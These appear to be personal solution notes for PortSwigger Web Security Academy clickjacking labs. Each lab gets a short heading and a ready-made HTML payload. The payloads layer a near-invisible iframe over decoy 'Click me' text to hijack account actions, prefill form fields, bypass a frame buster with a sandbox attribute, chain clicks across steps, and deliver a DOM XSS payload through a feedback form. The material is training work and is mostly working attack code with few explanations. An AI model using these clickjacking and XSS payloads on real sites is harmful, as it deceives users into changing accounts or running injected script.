
## Prebuilt PoC
```html
<style> 
	iframe { 
	position:relative; 
	width:$width_value; 
	height: $height_value; 
	opacity: $opacity; 
	z-index: 2; 
} 
div { 
	position:absolute; 
	top:$top_value; 
	left:$side_value; 
	z-index: 1; 
} 
</style> 
<div>Test me</div> <iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```



## [Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)

```html
<style> 
	iframe { 
	position:relative; 
	width: 1000; 
	height: 1000; 
	opacity: 0.0001; 
	z-index: 2; 
} 
div { 
	position:absolute; 
	top:515; 
	left:60; 
	z-index: 1; 
} 
</style> 
<div>Click me</div> 
<iframe src="https://0a8400db045b118f81e944df00d800c7.web-security-academy.net/my-account"></iframe>
```


## [Clickjacking with form input data prefilled from a URL parameter](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)

- Search through the source code for the variable the holds the value for the email.
- Add this variable as a parameter in the URL. 
`https://0ac500d103d92a918161d96900b000de.web-security-academy.net/my-account?id=wiener&email=test@b.com`

```html
<style> 
	iframe { 
	position:relative; 
	width: 1000; 
	height: 1000; 
	opacity: 0.0001; 
	z-index: 2; 
} 
div { 
	position:absolute; 
	top:470; 
	left:60; 
	z-index: 1; 
} 
</style> 
<div>Click me</div> 
<iframe src="https://0ac500d103d92a918161d96900b000de.web-security-academy.net/my-account?email=test@b.com"></iframe>
```

## [Clickjacking with a frame buster script](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script)

`sandbox="allow-forms"`

```html
<style> 
	iframe { 
	position:relative; 
	width: 1000; 
	height: 1000; 
	opacity: 0.0001; 
	z-index: 2; 
} 
div { 
	position:absolute; 
	top:470; 
	left:60; 
	z-index: 1; 
} 
</style> 
<div>Click me</div> 
<iframe sandbox="allow-forms" src="https://0a5e004a034130dd80eba33b005c00b2.web-security-academy.net/my-account?email=test@b.com"></iframe>
```



## [Exploiting clickjacking vulnerability to trigger DOM-based XSS](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)

- Look for self XSS in a form like a submit feedback form
- Deliver XSS payload to victom via clickjacking attack

```html
<style>
 iframe {
  position:relative;
  width: 1000px;
  height: 900px;
  opacity: 0.000001;
  z-index: 2;
 }
 div {
  position:absolute;
  top: 815px;
  left: 40px;
  z-index: 1;
 }
</style>
<div>Click Here to Login</div>
<iframe
src="https://0a76002204bbae958068fd5a00030070.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```


## [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)

- Look for sensitive functionlity with multiple steps like a confurmation page.

```html
<style>
	iframe {
	    position:relative; 
	    width: 1000; 
    	    height: 1000; 
	    opacity: 0.0001; 
	    z-index: 2; 
	}
   .firstClick, .secondClick {
		position:absolute;
		top: 510;
		left: 60;
		z-index: 1;
	}
   .secondClick {
		top: 310;
		left: 200;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a1d001603c054108075534100d500be.web-security-academy.net/my-account"></iframe>

```

